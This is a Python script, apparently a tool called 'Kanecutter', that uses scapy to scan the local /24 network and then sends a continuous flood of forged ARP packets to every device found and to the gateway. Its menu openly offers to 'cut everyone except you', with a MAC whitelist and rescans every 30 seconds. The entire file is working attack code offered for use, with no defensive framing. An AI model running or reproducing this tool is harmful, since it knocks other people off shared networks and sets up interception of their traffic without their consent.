import threading

from scapy.all import ARP as scapy_arp
from scapy.all import Ether, conf, get_if_addr
from scapy.all import getmacbyip as scapy_get_mac_by_ip
from scapy.all import send as scapy_send
from scapy.all import srp

victims = []
threads = []
white_lists = []


def get_gateway_info():
    """
    Get the current router info
    :return: Ip address and MAC address
    """
    ip_address = conf.route.route("0.0.0.0")[2]
    mac_address = scapy_get_mac_by_ip(ip_address)
    return ip_address, mac_address


def scan_all_ip_addresses(target_ip):
    """
    Scan all the victims who are connecting with the current router
    :param target_ip: the gateway IP of the router
    :return: the list of clients
    """
    print("Scanning...")
    # IP Address for the destination
    # create ARP packet
    arp = scapy_arp(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether / arp
    result = srp(packet, timeout=6, verbose=0)[0]

    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({"ip_address": received.psrc, "mac_address": received.hwsrc})

    # print clients
    print("Available devices in the network:")
    print("IP" + " " * 18 + "MAC")
    for client in clients:
        print("{:16}    {}".format(client["ip_address"], client["mac_address"]))

    return clients


def is_in_white_list(mac_address):
    """
    Check whether this mac_address is in the white_lists
    :param mac_address: the MAC Address
    :return: boolean
    """
    return (False, True)[mac_address in white_lists]


def attack(ip_address, mac_address):
    """
    Attack victim
    :param ip_address: the Ip Address
    :param mac_address: the MAC Address
    :return:
    """
    gw_ip_address, gw_mac_address = get_gateway_info()
    while True:
        packet_1 = scapy_arp(
            op=1, pdst=ip_address, hwdst=mac_address, psrc=gw_ip_address
        )
        packet_2 = scapy_arp(
            op=1, pdst=gw_ip_address, hwdst=gw_mac_address, psrc=ip_address
        )
        scapy_send(packet_1, verbose=0)
        scapy_send(packet_2, verbose=0)


def attack_all_and_interval_scan_ip(target_ip, recall_after_second=30):
    """
    Attack all victims and interval scanning
    :param target_ip: the gateway IP of the router
    :param recall_after_second: recall every seconds
    :return:
    """
    global victims
    clients = scan_all_ip_addresses(target_ip)
    threading.Timer(
        interval=recall_after_second,
        function=attack_all_and_interval_scan_ip,
        args=(target_ip, recall_after_second),
    ).start()
    if len(clients) - len(victims) > 0:
        victims = clients
        victims_without_you = filter(
            lambda victim: victim["ip_address"] != get_if_addr(conf.iface), victims
        )
        for t in threads:
            t.stop()
        arp_spoofing(victims_without_you)


def set_the_white_lists():
    global white_lists

    choice = ""
    while choice != "quit":
        choice = input("Add MAC Address(Enter 'quit' for exit):")
        print("The white lists:")
        if choice != "quit":
            white_lists.append(choice)
        for m in white_lists:
            print(m)


def arp_spoofing(list_victims):
    """
    ARP Spoofing
    :param list_victims: the list of victims
    :return:
    """
    global threads
    threads = []
    for victim in list_victims:
        if not is_in_white_list(victim["mac_address"]):
            threads.append(threading.Thread(
                target=attack, args=(victim["ip_address"], victim["mac_address"])
            ))

    for t in threads:
        t.start()


def print_list_of_actions():
    print("-----------------")
    print("List of actions:")
    print("[a] - Cut everyone except you")
    print("[s] - Scan network")
    print("[w] - Set the white list")
    print("[q] - Quit")


if __name__ == "__main__":
    print(
        """
         ____  __.                                        __     __                      
         |    |/ _|_____     ____    ____   ____   __ __ _/  |_ _/  |_   ____ _______     
         |      <  \__  \   /    \ _/ __ \_/ ___\ |  |  \\\   __\\\   __\_/ __ \\\_  __ \ 
         |    |  \  / __ \_|   |  \\\  ___/\  \___ |  |  / |  |   |  |  \  ___/ |  | \/   
         |____|__ \(____  /|___|  / \___  >\___  >|____/  |__|   |__|   \___  >|__|       
                 \/     \/      \/      \/     \/                           \/            
                                                       --written by kanetu731@gmail.com           
        """
    )

    input_is_valid = False
    gw_ip_address, _ = get_gateway_info()

    while not input_is_valid:
        print_list_of_actions()
        choice = input(">")
        if choice == "a":
            attack_all_and_interval_scan_ip(gw_ip_address + "/24")
            input_is_valid = True
        elif choice == "s":
            scan_all_ip_addresses(gw_ip_address + "/24")
            input_is_valid = False
        elif choice == "w":
            set_the_white_lists()
            input_is_valid = False
        elif choice == "q":
            exit()
        else:
            print("Your input isn't valid, Please make it the right way")
